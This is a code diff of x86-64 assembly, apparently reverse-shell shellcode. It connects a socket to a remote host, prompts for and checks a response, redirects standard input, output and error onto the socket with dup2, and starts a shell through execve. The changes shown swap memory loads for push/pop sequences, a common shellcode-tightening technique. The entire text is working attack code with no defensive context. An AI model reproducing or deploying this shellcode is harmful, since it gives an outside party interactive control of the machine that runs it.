@@ -64,8 +64,9 @@ _main:
 	push rax 	  	    ; store socket id on stack
 	
 ; Connect to remote host
-	mov rdi, [rbp-24]
-	lea rsi, [rbp-16]
+	pop rdi
+	push rdi            ; socket id
+	lea rsi, [rbp-16]   ; sockaddr struct
 	xor rdx, rdx
 	push rdx
 	pop rax
@@ -80,7 +81,8 @@ _main:
 	call _prompt
 	
 ; Listen for response
-	mov rdi, [rbp-24]	; socket id
+	pop rdi
+	push rdi            ; socket id
 	lea rsi, [rbp-16]	; buffer address
 	xor rax, rax 		; Zero out registers
 	push rax
@@ -113,7 +115,8 @@ _cmploop:
 	xor rax, rax 
 	add al, 33		; dup2		
 	mov r8, rax
-	mov rdi, [rbp-24]	; client socket id
+	pop rdi
+	push rdi            ; socket id
 	xor rsi, rsi		; STDIN
 	syscall 
 
@@ -124,7 +127,7 @@ _cmploop:
 	mov rax, r8		; dup2
 	inc esi			; STDERR
 	syscall
-
+	
 _spawn:
 	xor rax, rax
 	push rax
@@ -138,10 +141,7 @@ _spawn:
 	mov rsi, rsp		; args array address
 	add al, 59		; execve
 	syscall
-	call _exit
-
-	
-	
+	call _exit	
 	
 	
 	
